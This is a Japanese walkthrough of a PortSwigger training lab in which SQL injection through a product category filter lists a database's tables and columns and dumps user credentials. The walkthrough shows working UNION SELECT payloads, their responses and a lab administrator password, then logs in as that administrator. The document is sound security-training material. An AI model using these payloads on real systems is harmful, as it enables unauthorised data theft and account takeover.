# SQL インジェクション攻撃、Oracle 以外のデータベース上のデータベースの内容をリストする

次のハッキングラボを実施します  
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle  
このラボには、製品カテゴリ フィルターに SQL インジェクションの脆弱性が含まれています。クエリの結果はアプリケーションの応答で返されるため、UNION 攻撃を使用して他のテーブルからデータを取得できます。

- 1. Burp Suite を起動して、Proxy タブからブラウザを起動します
- 2. ハッキングラボにアクセスします
- 3. カテゴリーでフィルタリングします
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/39484716-5966-46ef-8582-1c32694198b6)
- 4. GET /filter?category=Pets HTTP/2 リクエストを send to repeater します
- 5. テーブル一覧を取得する SQL をユニオンして送信します

```
GET /filter?category=Pets'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- HTTP/2
```

結果としてテーブル一覧が取得できます

```html
<tr>
  <th>users_yxqakq</th>
</tr>
```

- 6. users テーブルの詳細を取得します

```
GET /filter?category=Pets'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_yxqakq'-- HTTP/2
```

レスポンス

```html
<tr>
  <th>password_xqarey</th>
</tr>
<tr>
  <th>username_ohniyp</th>
</tr>
```

- 7. ユーザーテーブルの一覧データを取得します

```
GET /filter?category=Pets'+UNION+SELECT+username_ohniyp,+password_xqarey+FROM+users_yxqakq-- HTTP/2
```

レスポンス

```html
<th>administrator</th>
<td>0wf4sjmsmwogq5xw40dd</td>
```

- 8. 取得した管理者アカウントでログインします
